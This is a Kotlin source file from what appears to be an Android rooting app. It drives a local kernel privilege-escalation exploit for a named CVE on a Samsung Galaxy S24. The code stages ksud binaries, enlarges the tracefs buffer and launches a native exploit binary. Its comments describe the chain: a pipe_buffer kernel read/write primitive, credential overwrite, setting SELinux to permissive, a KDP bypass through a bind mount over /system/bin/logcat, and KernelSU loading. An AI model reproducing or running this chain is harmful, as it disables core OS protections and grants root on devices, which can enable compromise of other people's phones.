package com.roottimer.app

import android.content.Context
import android.os.Process
import java.io.File
import java.io.IOException
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Shizuku UserService: runs the CVE-2026-98260 timer exploit as the shell user.
 *
 * Chain (all verified on the target S24 / 6.1.162-android14-11):
 *  1. stage ksud from the APK (jniLibs/libksud.so) to /data/local/tmp/samtimer/ksud
 *  2. raise the tracefs buffer (the leak needs headroom)
 *  3. run libtimer.so in "umhpipe" mode: pipe_buffer kernel r/w primitive ->
 *     cred -> SELinux permissive -> uid=0 child -> bind-mount ksud over
 *     /system/bin/logcat (KDP bypass) -> ksud late-load -> KSU_LOADED
 *  4. failed-plant zombies are made reap-safe (their posix-cpu-timer queue
 *     leftmost pointers are zeroed through the write primitive) and reaped
 *     immediately, so the exploit exits cleanly with no zombie left and
 *     nothing for init to reap later. Parking is only a last-resort fallback
 *     when a repair plant cannot land. KSU keeps root either way.
 */
class RootService(private val context: Context) : IRootService.Stub() {

    private val running = AtomicBoolean(false)

    companion object {
        private const val WORK_DIR = "/data/local/tmp/samtimer"
        // The exploit hardcodes the bind-mount source to WORK_DIR/ksud, and
        // the Samsung-patched ksud late-load expects a staged copy at
        // /data/local/tmp/.ksud-stage (it renames that file onto the same
        // /data filesystem before loading the module -- RootMyGalaxy stages
        // both paths the same way).
        private const val KSUD_STAGE_PATH = "/data/local/tmp/.ksud-stage"
        private const val TRACE_BUF = "/sys/kernel/tracing/buffer_size_kb"
        private const val INJECT_TIMEOUT_SEC = 420L
    }

    override fun isReady(): Boolean {
        val uid = Process.myUid()
        return uid == 2000 || uid == 0
    }

    /** True when the KernelSU module is live in /proc/modules (shell can read it). */
    override fun isRooted(): Boolean = try {
        java.io.File("/proc/modules").useLines { lines ->
            lines.any { it.startsWith("kernelsu ") }
        }
    } catch (_: Exception) {
        false
    }

    override fun destroy() {}

    override fun runExploit(callback: IRootCallback?) {
        if (callback == null) return
        if (!running.compareAndSet(false, true)) {
            callback.onLog("error: another run is already in progress")
            callback.onComplete(1, false)
            return
        }
        Thread({
            val ksuLoaded = java.util.concurrent.atomic.AtomicBoolean(false)
            var exitCode = 1
            try {
                exitCode = runChain(callback, ksuLoaded)
            } catch (e: Exception) {
                runCatching { callback.onLog("error: ${e.message}") }
            } finally {
                runCatching { callback.onComplete(exitCode, ksuLoaded.get()) }
                running.set(false)
            }
        }, "rt-runner").start()
    }

    private fun log(callback: IRootCallback, line: String) {
        runCatching { callback.onLog(line) }
    }

    private fun runChain(callback: IRootCallback, ksuLoaded: java.util.concurrent.atomic.AtomicBoolean): Int {
        val uid = Process.myUid()
        if (uid != 2000 && uid != 0) {
            log(callback, "error: not running as shell/root (uid=$uid)")
            return 1
        }
        log(callback, "shell context ok (uid=$uid)")

        val nativeDir = File(context.applicationInfo.nativeLibraryDir)
        val timerBin = File(nativeDir, "libtimer.so")
        val ksudSrc = File(nativeDir, "libksud.so")
        if (!timerBin.isFile) {
            log(callback, "error: exploit binary missing: ${timerBin.absolutePath}")
            return 1
        }

        // 1. workdir + ksud staging (the exploit hardcodes /data/local/tmp/samtimer/ksud)
        val workDir = File(WORK_DIR)
        if (!(workDir.isDirectory || workDir.mkdirs())) {
            log(callback, "error: cannot create $WORK_DIR")
            return 1
        }
        val ksud = File(workDir, "ksud")
        try {
            ksudSrc.copyTo(ksud, overwrite = true)
            if (!ksud.setExecutable(true, false)) {
                log(callback, "warn: chmod +x ksud failed")
            }
            log(callback, "staged ksud (${ksud.length()} bytes)")
            // Second staged copy the patched late-load looks for.
            val stage = File(KSUD_STAGE_PATH)
            try {
                ksudSrc.copyTo(stage, overwrite = true)
                stage.setExecutable(true, false)
                log(callback, "staged ksud at $KSUD_STAGE_PATH")
            } catch (e: IOException) {
                log(callback, "warn: .ksud-stage copy failed (${e.message})")
            }
        } catch (e: IOException) {
            log(callback, "warn: ksud staging failed (${e.message}); KSU load will fail")
        }

        // 1c. UMH helper: the same payload binary under the path the fake
        // usermodehelper execs (ROOT_UMH_PATH); --umh runs setksu_main.
        try {
            val uhexec = File(workDir, "uhexec")
            timerBin.copyTo(uhexec, overwrite = true)
            if (!uhexec.setExecutable(true, false)) {
                log(callback, "warn: chmod +x uhexec failed")
            }
            log(callback, "staged uhexec (${uhexec.length()} bytes)")
        } catch (e: IOException) {
            log(callback, "warn: uhexec staging failed (${e.message}); KSU load will fail")
        }

        // 2. tracefs buffer headroom (root-only write as shell is allowed here)
        runCatching {
            File(TRACE_BUF).writeText("8192\n")
            log(callback, "trace buffer set to 8192kB")
        }.onFailure {
            log(callback, "warn: trace buffer write failed (${it.message})")
        }

        // 3. run the exploit (umhpipe: pipe r/w primitive -> fake workqueue
        // item -> kernel-issued root usermodehelper -> ksud late-load)
        log(callback, "starting exploit (umhpipe mode)...")
        val proc = ProcessBuilder(timerBin.absolutePath, "umhpipe")
            .directory(workDir)
            .redirectErrorStream(true)
            .start()

        val parked = java.util.concurrent.atomic.AtomicBoolean(false)
        val reader = Thread({
            try {
                proc.inputStream.bufferedReader().useLines { lines ->
                    for (line in lines) {
                        log(callback, line)
                        if (line.contains("KSU_LOADED")) ksuLoaded.set(true)
                        if (line.contains("PARKED_AFTER_SUCCESS")) parked.set(true)
                    }
                }
            } catch (_: Exception) {
            }
        }, "rt-tailer")
        reader.isDaemon = true
        reader.start()

        val finished = runCatching {
            proc.waitFor(INJECT_TIMEOUT_SEC, java.util.concurrent.TimeUnit.SECONDS)
        }.getOrDefault(false)
        if (!finished) {
            // Do NOT SIGKILL: the exploit may hold the reclaimed page; a kill
            // can panic the kernel. Leave it parked and report timeout.
            if (parked.get() || ksuLoaded.get()) {
                // Success path: the exploit drained its pools and parked as
                // the holder for failed-plant zombies (reaping those from a
                // dead parent corrupts kernel memory). It must stay alive
                // until reboot -- never force-stop it.
                log(callback, "success; exploit parked holding zombies until reboot (do not force-stop it)")
                return 0
            }
            log(callback, "error: exploit did not finish in ${INJECT_TIMEOUT_SEC}s (left running)")
            return 4
        }
        val rc = proc.exitValue()
        log(callback, "exploit finished rc=$rc")
        return rc
    }
}
